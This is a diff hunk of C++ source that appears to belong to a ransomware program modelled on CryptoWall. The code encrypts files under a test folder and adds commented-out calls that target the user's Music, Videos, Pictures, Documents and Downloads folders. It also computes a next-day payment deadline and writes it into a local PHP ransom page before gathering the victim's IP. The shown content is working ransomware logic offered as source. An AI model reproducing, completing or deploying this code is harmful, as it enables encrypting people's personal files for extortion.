@@ -93,48 +93,26 @@ int main() {
   fclose(kfile);
 
   /// ENCRYPT FILES
-  SearchFiles("testfolder", key); // Encrypt Files in this folder and subfolders
+  // Encrypt Files in this folders and subfolders:
+  SearchFiles("testfolder", key);
+  //SearchFiles("C:\\Users\\User\\Music", key);
+  //SearchFiles("C:\\Users\\User\\Videos", key);
+  //SearchFiles("C:\\Users\\User\\Pictures", key);
+  //SearchFiles("C:\\Users\\User\\Documents", key);
+  //SearchFiles("C:\\Users\\User\\Downloads", key);
 
-  /// GET TIME GMT OF TOMORROW
-  unsigned int daysinmon[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
-  tm* timeinfo = localtime(&seed);
-  unsigned int day = timeinfo->tm_mday;
-  unsigned int mon = timeinfo->tm_mon + 1;
+  /// GET TIME OF TOMORROW
+  const int timediff = -8; // php time is 8 less that localtime
+  time_t time = seed + (24 + timediff) * 60 *60;
+  tm* timeinfo = localtime(&time);
   unsigned int year = timeinfo->tm_year + 1900;
-  if (day == daysinmon[mon]) { // if it's the last day of the month
-    day = 1; // tomorrow is 1st
-    mon++; // of the next month
-    if (mon > 12) { // After december
-      mon = 1; // is January
-      year++; // of the next year
-    }
-  } else
-    day++; // Or it's just tomorrow
-  /// EIGHT HOUR AGO WAS...
-  unsigned int hour = timeinfo->tm_hour;
-  if (hour < 8) { // PHP use GMT time
-    if (day > 1) {
-      int remaining = hour - 8;
-      hour = 24 - remaining;
-      day--; // the last day
-    } else {
-      if (mon > 1) {
-        mon--; // the last month
-        day = daysinmon[mon];
-      } else {
-        day = 31;
-        mon = 12;
-        year--; // the last year
-      }
-    }
-  } else hour -= 8; // eight hour ago
-
-  // it should be way easier to increase POSIX time in 24 - 8 hours
+  unsigned int month = timeinfo->tm_mon + 1;
 
   /// ADD DATE TO FILE
   FILE* cryptowall = fopen("C:\\xampp\\htdocs\\cryptowall\\index.php", "r+");
   fseek(cryptowall, 96, SEEK_SET);
-  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, mon, day, hour, timeinfo->tm_min, timeinfo->tm_sec);
+  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
+          timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 
   /// GET IP
   unsigned int ip[4];
